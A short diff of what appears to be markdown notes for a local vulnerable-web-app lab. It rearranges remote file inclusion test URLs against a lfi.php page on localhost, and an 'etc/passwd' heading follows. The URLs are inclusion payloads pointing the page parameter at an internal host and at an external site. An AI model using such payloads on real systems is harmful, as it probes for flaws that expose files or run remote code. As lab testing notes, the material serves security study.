@@ -11,9 +11,11 @@ For the RFI payloads you have to change the IP to the IP from the internal netwo
 ### RFI 
 
 - [http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?](http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?)
-- [http://127.0.0.1:8883/lfi.php?page=http://google.com](http://127.0.0.1:8883/lfi.php?page=http://google.com)
 
 see `allow_url_include` in response
+
+- [http://127.0.0.1:8883/lfi.php?page=http://google.com](http://127.0.0.1:8883/lfi.php?page=http://google.com)
+
 
 ### etc/passwd
 
